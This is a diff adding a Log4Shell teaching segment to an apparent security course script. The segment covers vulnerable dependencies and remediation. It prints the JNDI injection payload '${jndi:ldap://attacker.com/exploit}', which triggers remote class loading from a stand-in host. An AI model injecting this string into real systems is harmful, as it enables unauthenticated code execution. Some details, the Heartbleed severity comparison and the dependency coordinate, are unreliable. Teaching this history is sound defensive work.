@@ -558,6 +558,44 @@ And Content Security Policy: add the HTTP header `Content-Security-Policy: scrip
 
 ---
 
+### Teaching Moment: Log4Shell — A06 in Practice (10 minutes)
+
+"Before we move to A08 and beyond, I need to give you one more teaching moment — arguably the most important vulnerability of the last decade.
+
+December 9, 2021. It was a Friday.
+
+A researcher published proof that Apache Log4j — a Java logging library that is installed in literally *billions* of Java applications — had a remote code execution vulnerability. CVSS score: 10.0. Maximum. The only maximum-severity vulnerability since Heartbleed.
+
+Here's what makes it terrifying. Log4j is used EVERYWHERE. Amazon AWS, Apple iCloud, Microsoft Azure, Google Cloud, Tesla, Cloudflare, LinkedIn, Twitter, governments around the world — all running Log4j.
+
+The exploit is absurdly simple. A username field. A search box. A user-agent header. Anywhere the application LOGS what a user types, you can type this:
+
+`${jndi:ldap://attacker.com/exploit}`
+
+Log4j sees this, tries to resolve it — and makes an outbound call to the attacker's server. The attacker's server returns a malicious Java class. The victim server executes it. Remote code execution. Without any authentication.
+
+A username box. That's all it took to hack millions of servers.
+
+**[Ask the class:]** Who installed Log4j? Did Amazon install it? Did Apple install it? Did the Nigerian bank install it?
+
+No. Their DEVELOPERS installed it. As a dependency. One line in a build file. `log4j:log4j:2.14.1`.
+
+This is OWASP A06 — Vulnerable and Outdated Components. The vulnerability wasn't in the code these organisations wrote. It was in the code they included.
+
+This is why **Software Composition Analysis (SCA)** — scanning all your third-party dependencies for known CVEs — is now a security requirement, not a nice-to-have. Tools like Snyk, Dependabot, and OWASP Dependency-Check do this automatically.
+
+The lesson: you are responsible for the security of every line of code your application runs — including the code you didn't write.
+
+Remediation for Log4Shell: upgrade Log4j to version 2.17.1 or later. The patch was available within 24 hours. The organisations that patched quickly were safe. The ones that didn't were compromised.
+
+Within 72 hours of disclosure, over 800,000 exploitation attempts per hour were recorded globally. Nation-state attackers, ransomware groups, and script kiddies were all running the same single line of code.
+
+One CVE. One dependency. Billions of vulnerable systems. 72 hours.
+
+Remember this when someone tells you that keeping software updated is not a priority."
+
+---
+
 # MODULE 8: SOCIAL ENGINEERING
 ## Full Teaching Script
 
